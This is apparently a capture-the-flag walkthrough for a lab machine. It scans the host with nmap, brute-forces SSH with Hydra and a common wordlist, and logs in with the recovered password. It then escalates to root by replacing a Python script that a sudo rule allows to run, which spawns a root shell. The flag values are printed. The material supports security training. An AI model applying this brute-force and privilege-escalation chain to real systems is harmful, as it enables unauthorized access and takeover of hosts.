As always after deploing machine i scaned the adress

```
nmap -A -v 10.10.203.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 02:17 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:17
Completed NSE at 02:17, 0.00s elapsed
Initiating NSE at 02:17
Completed NSE at 02:17, 0.00s elapsed
Initiating NSE at 02:17
Completed NSE at 02:17, 0.00s elapsed
Initiating Ping Scan at 02:17
Scanning 10.10.203.86 [4 ports]
Completed Ping Scan at 02:17, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:17
Completed Parallel DNS resolution of 1 host. at 02:17, 0.00s elapsed
Initiating SYN Stealth Scan at 02:17
Scanning 10.10.203.86 [1000 ports]
Discovered open port 22/tcp on 10.10.203.86
Discovered open port 80/tcp on 10.10.203.86
Completed SYN Stealth Scan at 02:17, 3.03s elapsed (1000 total ports)
Initiating Service scan at 02:17
Scanning 2 services on 10.10.203.86
Completed Service scan at 02:18, 6.40s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.203.86
Initiating Traceroute at 02:18
Completed Traceroute at 02:18, 0.12s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 02:18
Completed Parallel DNS resolution of 2 hosts. at 02:18, 0.01s elapsed
NSE: Script scanning 10.10.203.86.
Initiating NSE at 02:18
Completed NSE at 02:18, 3.54s elapsed
Initiating NSE at 02:18
Completed NSE at 02:18, 0.47s elapsed
Initiating NSE at 02:18
Completed NSE at 02:18, 0.00s elapsed
Nmap scan report for 10.10.203.86
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
```
So it has ssh service in 22 port, so i need to find at least username to brutforce the ssh

so as expected in first page of http://10.10.203.86 there is a post, which posted by 
`meliodas`

After finding a user name i proceed to brutforce ssh

```
hydra -V -l meliodas -P /usr/share/wordlists/rockyou.txt -f ssh://10.10.203.86 -t 4 -I



[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "pictures" - 213 of 14344402 [child 6] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "asshole" - 214 of 14344402 [child 3] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "sophie" - 215 of 14344402 [child 4] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "jessie" - 216 of 14344402 [child 5] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "hellokitty" - 217 of 14344402 [child 7] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "claudia" - 218 of 14344402 [child 14] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "babygirl1" - 219 of 14344402 [child 11] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "angelica" - 220 of 14344402 [child 13] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "austin" - 221 of 14344402 [child 9] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "mahalko" - 222 of 14344402 [child 1] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "victor" - 223 of 14344402 [child 2] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "horses" - 224 of 14344402 [child 6] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "tiffany" - 225 of 14344402 [child 4] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "mariana" - 226 of 14344402 [child 3] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "eduardo" - 227 of 14344402 [child 5] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "andres" - 228 of 14344402 [child 7] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "courtney" - 229 of 14344402 [child 10] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "booboo" - 230 of 14344402 [child 14] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "kissme" - 231 of 14344402 [child 11] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "harley" - 232 of 14344402 [child 13] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "ronaldo" - 233 of 14344402 [child 0] (0/3)
[ATTEMPT] target 10.10.203.86 - login "meliodas" - pass "iloveyou1" - 234 of 14344402 [child 9] (0/3)
[22][ssh] host: 10.10.203.86   login: meliodas   password: iloveyou1
[STATUS] attack finished for 10.10.203.86 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

```
now that i have password i can connect to machine by ssh service 

```
ssh meliodas@10.10.203.86
meliodas@10.10.203.86's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118

meliodas@ubuntu:~$ ls -al
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt

meliodas@ubuntu:~$ cat user.txt 
6d488cbb3f111d135722c33cb635f4ec
```
now to get root.txt I need root privilages 

# Privilage escalation

Then I listed the sudo commands that I can run as root user and found that 
I can run python file ‘bak.py’ as root user.

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

```

so proceed to replace bak.py 

```
rm -rf bak.py

echo 'import os; os.system("/bin/bash");' >>bak.py
meliodas@ubuntu:~$ ls -al
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Jul 11 01:02 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-rw-r-- 1 meliodas meliodas   35 Jul 11 01:02 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt

```
So by deleting bak.py and creating a new bak.py, I steel can run bak.py as root(because of privilage configuration).

!!!Notice it will as root only if use absolute path to your bak.py file
```
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
root@ubuntu:~# ls -al
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Jul 11 01:02 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-rw-r-- 1 meliodas meliodas   35 Jul 11 01:02 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
root@ubuntu:~# ls /root
root.txt
root@ubuntu:~# cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617
```

